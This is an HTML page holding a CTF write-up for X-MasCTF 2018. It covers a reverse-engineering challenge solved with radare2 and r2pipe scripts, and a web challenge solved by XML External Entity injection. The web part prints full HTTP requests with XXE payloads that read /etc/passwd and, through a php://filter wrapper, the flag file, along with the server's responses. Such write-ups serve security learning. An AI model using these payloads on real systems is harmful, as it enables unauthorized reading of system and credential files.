<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>X-MasCTF 2018 writeup - gi0cann&#39;s notes</title>
  <meta property="og:title" content="X-MasCTF 2018 writeup" />
  <meta name="twitter:title" content="X-MasCTF 2018 writeup" />
  <meta name="description" content="X-MasCTF 2018 RE: Endless Christmas We are given the &lsquo;chall&rsquo; file.
Running the file command shows us that it&rsquo;s a 64 bit ELF binary.
We proceed to open the file with radare2:
r2 -A chall Looking at the main function we see that it creates and executes a file from the result of the function @ 0x4006a4.
main retrieve argc store in local variable local_14h retrieve argv store in local variable local_20h store &#34;fileXXXXXX&#34; in local variable template call 4006a4(0x6b7ce0, 0x601080, 0xb6b21) 0x6b7ce0 - global variable empty 0x601080 - global variable pointing to string of chars call mkstemp(template) store return value in fildes = file descriptor call fchmod(fildes, 0x1ff) call write(fildes, 0x6b7ce0, 0x12c000) call fsync(fildes) call close(fildes) call execve(template, 0x0, 0x0) return Running the chall binary generates 13 files and then prompts us for the flag.">
  <meta property="og:description" content="X-MasCTF 2018 RE: Endless Christmas We are given the &lsquo;chall&rsquo; file.
Running the file command shows us that it&rsquo;s a 64 bit ELF binary.
We proceed to open the file with radare2:
r2 -A chall Looking at the main function we see that it creates and executes a file from the result of the function @ 0x4006a4.
main retrieve argc store in local variable local_14h retrieve argv store in local variable local_20h store &#34;fileXXXXXX&#34; in local variable template call 4006a4(0x6b7ce0, 0x601080, 0xb6b21) 0x6b7ce0 - global variable empty 0x601080 - global variable pointing to string of chars call mkstemp(template) store return value in fildes = file descriptor call fchmod(fildes, 0x1ff) call write(fildes, 0x6b7ce0, 0x12c000) call fsync(fildes) call close(fildes) call execve(template, 0x0, 0x0) return Running the chall binary generates 13 files and then prompts us for the flag.">
  <meta name="twitter:description" content="X-MasCTF 2018 RE: Endless Christmas We are given the &lsquo;chall&rsquo; file.
Running the file command shows us that it&rsquo;s a 64 bit ELF binary.
We proceed to open the file with radare2:
r2 -A …">
  <meta name="author" content="gi0cann"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "gi0cann&#39;s notes",
    
    "url": "https://gi0cann.github.io/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https://gi0cann.github.io/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https://gi0cann.github.io/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https://gi0cann.github.io/post/x-masctf2018-writeups/",
          "name": "X mas c t f 2018 writeup"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "gi0cann"
  },
  "headline": "X-MasCTF 2018 writeup",
  "description" : "X-MasCTF 2018 RE: Endless Christmas We are given the &amp;lsquo;chall&amp;rsquo; file.
Running the file command shows us that it&amp;rsquo;s a 64 bit ELF binary.
We proceed to open the file with radare2:
r2 -A chall Looking at the main function we see that it creates and executes a file from the result of the function @ 0x4006a4.
main retrieve argc store in local variable local_14h retrieve argv store in local variable local_20h store &amp;#34;fileXXXXXX&amp;#34; in local variable template call 4006a4(0x6b7ce0, 0x601080, 0xb6b21) 0x6b7ce0 - global variable empty 0x601080 - global variable pointing to string of chars call mkstemp(template) store return value in fildes = file descriptor call fchmod(fildes, 0x1ff) call write(fildes, 0x6b7ce0, 0x12c000) call fsync(fildes) call close(fildes) call execve(template, 0x0, 0x0) return Running the chall binary generates 13 files and then prompts us for the flag.",
  "inLanguage" : "en",
  "wordCount": 884,
  "datePublished" : "2018-12-16T21:08:42",
  "dateModified" : "2018-12-16T21:08:42",
  "image" : "https://gi0cann.github.io/img/avatar-icon.png",
  "keywords" : [ "re, radare2, ctf" ],
  "mainEntityOfPage" : "https://gi0cann.github.io/post/x-masctf2018-writeups/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https://gi0cann.github.io/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https://gi0cann.github.io/img/avatar-icon.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="X-MasCTF 2018 writeup" />
<meta property="og:description" content="X-MasCTF 2018 RE: Endless Christmas We are given the &lsquo;chall&rsquo; file.
Running the file command shows us that it&rsquo;s a 64 bit ELF binary.
We proceed to open the file with radare2:
r2 -A chall Looking at the main function we see that it creates and executes a file from the result of the function @ 0x4006a4.
main retrieve argc store in local variable local_14h retrieve argv store in local variable local_20h store &#34;fileXXXXXX&#34; in local variable template call 4006a4(0x6b7ce0, 0x601080, 0xb6b21) 0x6b7ce0 - global variable empty 0x601080 - global variable pointing to string of chars call mkstemp(template) store return value in fildes = file descriptor call fchmod(fildes, 0x1ff) call write(fildes, 0x6b7ce0, 0x12c000) call fsync(fildes) call close(fildes) call execve(template, 0x0, 0x0) return Running the chall binary generates 13 files and then prompts us for the flag.">
<meta property="og:image" content="https://gi0cann.github.io/img/avatar-icon.png" />
<meta property="og:url" content="https://gi0cann.github.io/post/x-masctf2018-writeups/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="gi0cann&#39;s notes" />
  <meta name="twitter:title" content="X-MasCTF 2018 writeup" />
  <meta name="twitter:description" content="X-MasCTF 2018 RE: Endless Christmas We are given the &lsquo;chall&rsquo; file.
Running the file command shows us that it&rsquo;s a 64 bit ELF binary.
We proceed to open the file with radare2:
r2 -A …">
  <meta name="twitter:image" content="https://gi0cann.github.io/img/avatar-icon.png" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@gi0cann" />
  <meta name="twitter:creator" content="@gi0cann" />
  <link href='https://gi0cann.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
  <meta property="og:image" content="https://gi0cann.github.io/img/avatar-icon.png" />
  <meta name="twitter:image" content="https://gi0cann.github.io/img/avatar-icon.png" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@gi0cann" />
  <meta name="twitter:creator" content="@gi0cann" />
  <meta property="og:url" content="https://gi0cann.github.io/post/x-masctf2018-writeups/" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="gi0cann&#39;s notes" />

  <meta name="generator" content="Hugo 0.53" />
  <link rel="alternate" href="https://gi0cann.github.io/index.xml" type="application/rss+xml" title="gi0cann&#39;s notes">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="https://gi0cann.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
  <link rel="stylesheet" href="https://gi0cann.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://gi0cann.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://gi0cann.github.io/">gi0cann&#39;s notes</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="/">Blog</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="/tags">Tags</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="gi0cann&#39;s notes" href="https://gi0cann.github.io/">
            <img class="avatar-img" src="https://gi0cann.github.io/img/avatar-icon.png" alt="gi0cann&#39;s notes" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>X-MasCTF 2018 writeup</h1>
              
              
              
              
                <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on December 16, 2018
  
  
    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;5&nbsp;minutes
  
  
    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;884&nbsp;words
  
  
    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;gi0cann
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        

<h2 id="x-masctf-2018-re-endless-christmas">X-MasCTF 2018 RE: Endless Christmas</h2>

<p>We are given the &lsquo;chall&rsquo; file.</p>

<p>Running the file command shows us that it&rsquo;s a 64 bit ELF binary.</p>

<p>We proceed to open the file with radare2:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">r2 -A chall</code></pre></div>
<p><img src="/chall-main.png" alt="chall-main" /></p>

<p>Looking at the main function we see that it creates and executes a file from the result of the function @ 0x4006a4.</p>

<h3 id="main">main</h3>
<div class="highlight"><pre class="chroma"><code class="language-highlight" data-lang="highlight">retrieve argc store in local variable local_14h
retrieve argv store in local variable local_20h
store &#34;fileXXXXXX&#34; in local variable template

call 4006a4(0x6b7ce0, 0x601080, 0xb6b21)
0x6b7ce0 - global variable empty
0x601080 - global variable pointing to string of chars

call mkstemp(template)
store return value in fildes = file descriptor

call fchmod(fildes, 0x1ff)

call write(fildes, 0x6b7ce0, 0x12c000)

call fsync(fildes)

call close(fildes)

call execve(template, 0x0, 0x0)

return</code></pre></div>
<p>Running the chall binary generates 13 files and then prompts us for the flag.</p>

<p>We use the following python script to get the functions for all 13 files.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">r2pipe</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">bindir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>

<span class="k">for</span> <span class="n">binary</span> <span class="ow">in</span> <span class="n">bindir</span><span class="p">:</span>
    <span class="n">r2</span> <span class="o">=</span> <span class="n">r2pipe</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">binary</span><span class="p">)</span>
    <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
    <span class="n">functions</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">cmdj</span><span class="p">(</span><span class="s1">&#39;aflj&#39;</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">binary</span>
    <span class="k">for</span> <span class="n">function</span> <span class="ow">in</span> <span class="n">functions</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">function</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
    <span class="k">print</span> <span class="s2">&#34;&#34;</span>

<span class="k">print</span> <span class="s2">&#34;Done!&#34;</span></code></pre></div>
<p>Comparing the output of our python script shows that all the file have the same functions except for one.</p>

<p>We open the file in radare2 and disassemble the main function.</p>

<p><img src="/final-main.png" alt="final-main" /></p>

<p>Looking a the disassembly we see that the main function takes our input and compares it to a constant after xor each character to that constant with 0xd.</p>

<p>We use a python script to extract the constant and xor to get the flag.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">r2pipe</span>
<span class="kn">import</span> <span class="nn">sys</span>


<span class="n">r2</span> <span class="o">=</span> <span class="n">r2pipe</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xd</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;ps @ 0x601060&#39;</span><span class="p">)])</span>
<span class="k">print</span> <span class="n">flag</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-highlight" data-lang="highlight">X-MAS{d3c0d3_4641n_4nd_4641n_4nd_4641n_4nd_4641n_4nd_fl46}</code></pre></div>
<h2 id="x-masctf-2018-web-our-christmas-wishlist">X-MasCTF 2018 WEB: Our Christmas Wishlist&rdquo;</h2>

<p>We are presented with a page with a textarea where you can input text.</p>

<p><img src="/wishlist-form-init.png" alt="initial-page" /></p>

<p>We put hello in the textarea an submit the request:</p>

<p><img src="/wishlist-form-hello.png" alt="hello-submit" /></p>

<p>We get the following response:</p>

<p><img src="/wishlist-form-hello-submit.png" alt="hello-response" /></p>

<p>Taking a look at the request in burp we see the following request:</p>
<div class="highlight"><pre class="chroma">POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 24
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;message&gt;hello&lt;/message&gt;</pre></div>
<p>with the following response:</p>
<div class="highlight"><pre class="chroma">HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Dec 2018 22:38:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 16

Your wish: hello</pre></div>
<p>Looking at the request we can see that our input is being sent as xml.</p>

<p>We proceed to sent some malformed xml to see how the xml parser will react:</p>
<div class="highlight"><pre class="chroma">POST / HTTP/1.1
Host: 199.247.6.180:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 2
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;&lt;</pre></div>
<p>Response:</p>
<div class="highlight"><pre class="chroma">HTTP/1.1 200 OK
Server: nginx
Date: Sun, 16 Dec 2018 21:19:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 811

&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): Entity: line 1: parser error : StartTag: invalid element name in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): &amp;lt;&amp;lt; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string():  ^ in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): Entity: line 1: parser error : Extra content at the end of the document in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string(): &amp;lt;&amp;lt; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  simplexml_load_string():  ^ in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;18&lt;/b&gt;&lt;br /&gt;
Your wish: </pre></div>
<p>The error messages in the request shows us the file with the code is located at &lsquo;/var/www/html/index.php&rsquo; and that it&rsquo;s using simplexml.</p>

<p>We try check for XXE(XML External Entity) and by trying retrieve /etc/passwd with the following request:</p>
<div class="highlight"><pre class="chroma">POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 125
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;?xml version=&#34;1.0&#34;?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY internal SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;
&lt;message&gt;hello:&amp;internal;&lt;/message&gt;</pre></div>
<p>And we get a reponse with the contents of the passwd file:</p>
<div class="highlight"><pre class="chroma">HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Dec 2018 23:56:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 1359

Your wish: hello:root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false
nginx:x:100:101:Linux User,,,:/var/cache/nginx:/sbin/nologin</pre></div>
<p>Now that we know it&rsquo;s vulnerable to XXE all we have to do is find and display the flag.</p>

<p>We send to following request to read the file containing the flag as base64 to avoid problem character for the xml parser:</p>
<div class="highlight"><pre class="chroma">POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 173
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

&lt;?xml version=&#34;1.0&#34;?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY internal SYSTEM &#39;php://filter/convert.base64-encode/resource=/var/www/html/flag.txt&#39;&gt;]&gt;
&lt;message&gt;&amp;internal;&lt;/message&gt;</pre></div>
<p>Response:</p>
<div class="highlight"><pre class="chroma">HTTP/1.1 200 OK
Server: nginx
Date: Sun, 16 Dec 2018 21:28:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 99

Your wish: WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=</pre></div>
<p>base64 decoding &lsquo;WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=&rsquo; give us &lsquo;X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To<strong>Jo1n_7he_p4r7y</strong>700______}&rsquo; as the flag.</p>


        
          <div class="blog-tags">
            
              <a href="https://gi0cann.github.io//tags/re/">re</a>&nbsp;
            
              <a href="https://gi0cann.github.io//tags/radare2/">radare2</a>&nbsp;
            
              <a href="https://gi0cann.github.io//tags/ctf/">ctf</a>&nbsp;
            
          </div>
        

        
            <hr/>
            <section id="social-share">
              <div class="list-inline footer-links">
                

<div class="share-box" aria-hidden="true">
    <ul class="share">
      
      <li>
        <a href="//twitter.com/share?url=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f&amp;text=X-MasCTF%202018%20writeup&amp;via=gi0cann" target="_blank" title="Share on Twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//plus.google.com/share?url=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f" target="_blank" title="Share on Google Plus">
          <i class="fab fa-google-plus"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f" target="_blank" title="Share on Facebook">
          <i class="fab fa-facebook"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//reddit.com/submit?url=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f&amp;title=X-MasCTF%202018%20writeup" target="_blank" title="Share on Reddit">
          <i class="fab fa-reddit"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f&amp;title=X-MasCTF%202018%20writeup" target="_blank" title="Share on LinkedIn">
          <i class="fab fa-linkedin"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f&amp;title=X-MasCTF%202018%20writeup" target="_blank" title="Share on StumbleUpon">
          <i class="fab fa-stumbleupon"></i>
        </a>
      </li>
  
      
      <li>
        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fgi0cann.github.io%2fpost%2fx-masctf2018-writeups%2f&amp;description=X-MasCTF%202018%20writeup" target="_blank" title="Share on Pinterest">
          <i class="fab fa-pinterest"></i>
        </a>
      </li>
    </ul>
  </div>
  
              </div>
            </section>
        

        
          
          
        
      </article>

      
        <ul class="pager blog-pager">
          
          
            <li class="next">
              <a href="https://gi0cann.github.io/post/35c3juniorctf-writeups/" data-toggle="tooltip" data-placement="top" title="35c3 Junior CTF writeup">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      
        
        
      

    </div>
  </div>
</div>

    <footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                <a href="mailto:youremail@domain.com" title="Email me">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://github.com/gi0cann" title="GitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://twitter.com/gi0cann" title="Twitter">
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            
            <a href="https://gi0cann.github.io/index.xml" title="RSS">
            
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              <a href="https://gi0cann.github.io">gi0cann</a>
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2018
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://gi0cann.github.io/">gi0cann&#39;s notes</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="http://gohugo.io">Hugo v0.53</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
          
        </p>
      </div>
    </div>
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
